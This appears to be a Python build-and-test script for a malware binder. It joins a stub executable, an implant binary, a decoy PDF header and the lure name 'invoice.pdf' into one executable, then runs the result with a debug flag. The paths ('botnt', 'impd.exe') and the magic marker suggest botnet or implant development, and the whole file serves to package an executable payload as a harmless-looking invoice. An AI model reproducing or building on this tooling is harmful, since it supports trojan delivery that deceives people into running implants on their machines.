import os, struct, subprocess, sys, tempfile
from pathlib import Path

MAGIC = b"PHNTBINDv1______"
tmp = Path(r"d:\botnt\.tmp")

def rb(p):
    with open(str(p), "rb") as fh:
        return fh.read()

stub = rb(tmp / "sdbg.exe")
imp = rb(tmp / "impd.exe")
doc = b"%PDF-1.4 decoy payload\r\n"
name = b"invoice.pdf"
footer = struct.pack("<IIIII", len(imp), len(doc), len(name), 1, 0) + MAGIC
out = tmp / "bound-debug.exe"
with open(str(out), "wb") as fh:
    fh.write(stub + imp + doc + name + footer)

env = dict(os.environ, PHANTOM_DEBUG="1")
p = subprocess.run([str(out)], capture_output=True, text=True, encoding="utf-8", errors="replace", timeout=40, env=env)
print("rc", p.returncode)
print("STDERR:", p.stderr[:3000])


